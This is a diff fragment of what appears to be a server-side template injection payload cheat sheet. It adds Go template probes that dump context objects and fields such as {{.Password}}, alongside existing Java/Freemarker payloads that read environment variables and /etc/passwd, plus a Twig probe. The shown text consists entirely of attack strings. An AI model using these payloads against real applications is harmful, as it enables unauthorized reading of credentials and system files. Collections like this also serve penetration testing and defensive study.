@@ -549,7 +549,12 @@ ${class.getResource("../../../../../index.html").getContent()}
 ${T(java.lang.System).getenv()}
 ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
 ```
-
+### `Golang`
+```
+{{ . }}
+{{.Email}}
+{{.Password}}
+```
 ### `Twig (PHP)`
 ```
 {{7*7}}
